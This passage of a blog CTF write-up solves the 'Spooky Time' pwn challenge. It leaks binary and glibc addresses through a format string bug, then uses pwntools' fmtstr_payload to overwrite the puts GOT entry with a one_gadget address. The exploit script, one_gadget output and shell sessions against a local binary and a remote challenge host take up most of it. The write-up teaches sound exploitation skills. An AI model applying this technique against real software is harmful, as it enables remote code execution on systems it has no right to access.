21: 0
22: 0
23: 0
24: 0
25: 0
26: 0
27: 0
28: 0
29: 0
30: 0
31: 0
32: 0
33: 0
34: 0
35: 0
36: 0
37: 0
38: 0
39: 0
40: 0
41: 0
42: 0
43: 0
44: 0
45: 0
46: 0
47: 591694f6743c6d00
48: 1
49: 7ffff7dbcd90
50: 0
51: 5555555553c0
52: 100000000
53: 7fffffffe7e8
54: 0
55: 47edbf377b597ad
56: 7fffffffe7e8
57: 5555555553c0
58: 555555557b80
59: 7ffff7ffd040
60: fb472429c1596cde
61: 22af37e9be135d12
62: 7fff00000000
63: 0
64: 0
65: 0
66: 0
67: e656b6af03dcc500
68: 0
69: 7ffff7dbce40
70: 7fffffffe7f8
71: 555555557b80
72: 7ffff7ffe2e0
73: 0
74: 0
75: 555555555160
76: 7fffffffe7e0
77: 0
78: 0
79: 555555555185
80: 7fffffffe7d8
81: 1c
82: 1
83: 7fffffffeabf
84: 0
85: 7fffffffeacd
86: 7fffffffead8
87: 7fffffffeaef
88: 7fffffffeb0a
89: 7fffffffeb40
90: 7fffffffeb51
91: 7fffffffeb7b
92: 7fffffffeb8c
93: 7fffffffeba3
94: 7fffffffebc1
95: 7fffffffebdc
96: 7fffffffebf4
97: 7fffffffec08
98: 7fffffffec1f
99: 7fffffffec34
100: 7fffffffec4d
</code></pre></div><p>From experience, I know that addresses that start with <code>555555555</code> are addresses within the binary, addresses that start with <code>7ffff7f</code> come from Glibc, and those that start with <code>7fffffff</code> are stack addresses.</p><p>Using GDB, we are able to find two addresses from the binary and from Glibc that will be useful to bypass PIE and ASLR:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">spooky_time</span>
Reading symbols from <span class="code-dark-green">spooky_time</span>...
(No debugging symbols found in <span class="code-dark-green">spooky_time</span>)  
<span class="code-red">gef‚û§  </span>start
<span class="code-blue">[+]</span> Breaking at '0x13c0'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef‚û§  </span>x 0x7ffff7ea7a37
<span class="code-dark-blue">0x7ffff7ea7a37</span> &lt;<span class="code-dark-yellow">write</span>+23&gt;:      0xf0003d48
<span class="code-green">gef‚û§  </span>x 0x7ffff7fac280
<span class="code-dark-blue">0x7ffff7fac280</span>: 0x00000008
<span class="code-green">gef‚û§  </span>x 0x7ffff7dbcd90
<span class="code-dark-blue">0x7ffff7dbcd90</span>: 0x59e8c789
<span class="code-green">gef‚û§  </span>x 0x5555555553c0
<span class="code-dark-blue">0x5555555553c0</span> &lt;<span class="code-dark-yellow">main</span>&gt;:  0xfa1e0ff3
<span class="code-green">gef‚û§  </span>x 0x555555557b80
<span class="code-dark-blue">0x555555557b80</span>: 0x55555200
<span class="code-green">gef‚û§  </span>x 0x7ffff7ffd040
<span class="code-dark-blue">0x7ffff7ffd040</span> &lt;<span class="code-dark-yellow">_rtld_global</span>&gt;:  0xf7ffe2e0
<span class="code-green">gef‚û§  </span>x 0x7ffff7dbce40
<span class="code-dark-blue">0x7ffff7dbce40</span> &lt;<span class="code-dark-yellow">__libc_start_main</span>+128&gt;: 0x593d8b4c  
</code></pre></div><p>For instance, we can take positions 51 (<code>0x5555555553c0</code>) and 69 (<code>0x7ffff7dbce40</code>) to find the base addresses of the binary and Glibc.</p><h3 id="exploit-develpment">Exploit develpment</h3><p>We can start writing the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"It's your chance to scare those little kids, say </span><span class="mtk4">something scary!</span><span class="mtk6">\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'%51$p.%69$p'</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Seriously?? I bet you can do better than </span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">leaks</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">().</span><span class="mtk8">split</span><span class="mtk1">(</span><span class="mtk4">'.'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">leaks</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">], </span><span class="mtk6">16</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">__libc_start_main_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">leaks</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">], </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">128</span>

<span class="mtk1">    </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">main_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.main</span>
<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">__libc_start_main_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__libc_start_main</span>

<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'ELF base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><p>Notice that I used <code>%p</code> instead of <code>%lx</code> to save space (the result will be almost the same). And there we have the base addresses:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './spooky_time'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './spooky_time': pid 415707
[<span class="code-green">+</span>] ELF base address: 0x555555554000
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7d93000
[<span class="code-blue">*</span>] Switching to interactive mode
Anyway, here comes another bunch of kids, let's try one more time..  


<span class="code-red">$</span>
</code></pre></div><p>At this point, we can enable ASLR and try again:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">echo</span> 2 | <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>  
2
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './spooky_time'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './spooky_time': pid 416286
[<span class="code-green">+</span>] ELF base address: 0x55af448fc000
[<span class="code-green">+</span>] Glibc base address: 0x7f62a0398000
[<span class="code-blue">*</span>] Switching to interactive mode
Anyway, here comes another bunch of kids, let's try one more time..  


<span class="code-red">$
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>In order to get RCE we must modify the GOT entry for <code>puts</code>, which is the next function being called after the second <code>printf</code>. We will enter a <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">one_gadget</span> <span class="mtku">glibc/libc.so.6</span>
<span class="rb-purple">0x50a37</span> posix_spawn(<span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x1c</span>, "/bin/sh", 0, <span class="rb-dark-green">rbp</span>, <span class="rb-dark-green">rsp</span>+<span class="rb-purple">0x60</span>, environ)  
<span class="rb-red">constraints</span>:
  <span class="rb-dark-green">rsp</span> & <span class="rb-purple">0xf</span> == 0
  <span class="rb-dark-green">rcx</span> == NULL
  <span class="rb-dark-green">rbp</span> == NULL || (u16)[<span class="rb-dark-green">rbp</span>] == NULL

<span class="rb-purple">0xebcf1</span> execve("/bin/sh", <span class="rb-dark-green">r10</span>, [<span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x70</span>])
<span class="rb-red">constraints</span>:
  address <span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x78</span> is writable
  [<span class="rb-dark-green">r10</span>] == NULL || <span class="rb-dark-green">r10</span> == NULL
  [[<span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x70</span>]] == NULL || [<span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x70</span>] == NULL

<span class="rb-purple">0xebcf5</span> execve("/bin/sh", <span class="rb-dark-green">r10</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  address <span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x78</span> is writable
  [<span class="rb-dark-green">r10</span>] == NULL || <span class="rb-dark-green">r10</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL

<span class="rb-purple">0xebcf8</span> execve("/bin/sh", <span class="rb-dark-green">rsi</span>, <span class="rb-dark-green">rdx</span>)
<span class="rb-red">constraints</span>:
  address <span class="rb-dark-green">rbp</span>-<span class="rb-purple">0x78</span> is writable
  [<span class="rb-dark-green">rsi</span>] == NULL || <span class="rb-dark-green">rsi</span> == NULL
  [<span class="rb-dark-green">rdx</span>] == NULL || <span class="rb-dark-green">rdx</span> == NULL
</code></pre></div><p>In order to write it, a manual approach is tedious (you can see this approach in <a href="../../../picoctf/binary-exploitation/fermat-strings">fermat-strings</a> and <a href="/en/htb/rope/">Rope machine</a>). This time, we can use <code>fmtstr_payload</code> from <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a>, which takes the offset where we control the stack and a mapping between the address where we want to write and the value we want to write. Hence, this is the second part of the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">one_gadgets</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">0x</span><span class="mtk6">50a37</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">ebcf1</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">ebcf5</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">ebcf8</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fmtstr_payload</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, {</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.puts: </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadgets</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]})</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">"Anyway, here comes another bunch of kids, let's t</span><span class="mtk4">ry one more time..</span><span class="mtk6">\n\n\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>  

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>If we try it locally, we will have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './spooky_time'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './spooky_time': pid 421975  
[<span class="code-green">+</span>] ELF base address: 0x55c73a537000
[<span class="code-green">+</span>] Glibc base address: 0x7f2a4f7a0000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt  glibc  solve.py  spooky_time
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s try on remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 159.65.48.79:31023
[<span class="code-blue">*</span>] './spooky_time'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-red">No RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Opening connection to 159.65.48.79 on port 31023: Done  
[<span class="code-green">+</span>] ELF base address: 0x557980faa000
[<span class="code-green">+</span>] Glibc base address: 0x7f85dd971000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
glibc
spooky_time
<span class="code-red">$</span> cat flag.txt
HTB{n0th1ng_sc4r1eR_th4n_fsb_w1th0ut_r3lR0}
</code></pre></div><p>The full exploit code is here: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HackTheBoo%20CTF/Pwn/Spooky%20Time/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#format-string-vulnerability">Format String vulnerability</a></li></ul></li><li><a href="#format-string-exploitation">Format String exploitation</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#exploit-develpment">Exploit develpment</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>